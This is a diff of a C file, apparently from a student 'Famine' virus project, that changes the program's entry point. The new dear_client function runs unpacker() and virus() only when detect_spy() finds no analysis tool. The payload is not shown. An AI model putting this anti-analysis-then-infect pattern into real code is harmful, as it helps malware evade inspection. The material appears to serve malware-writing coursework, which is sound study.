@@ -1,21 +1,25 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   main.c                                             :+:      :+:    :+:   */
+/*   dear_client.c                                      :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 07:23:16 by agrumbac         ###   ########.fr       */
+/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
+/*   Updated: 2019/06/07 07:24:07 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
+#include <sys/types.h>
 #include "famine.h"
-#include "syscall.h"
 
-int	_start(void)
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))
+
+void	dear_client(const struct client_info *client)
 {
-	virus();
-	famine_exit(0);
-	__builtin_unreachable();
+	if (detect_spy() == false)
+	{
+		unpacker();
+		virus();
+	}
 }
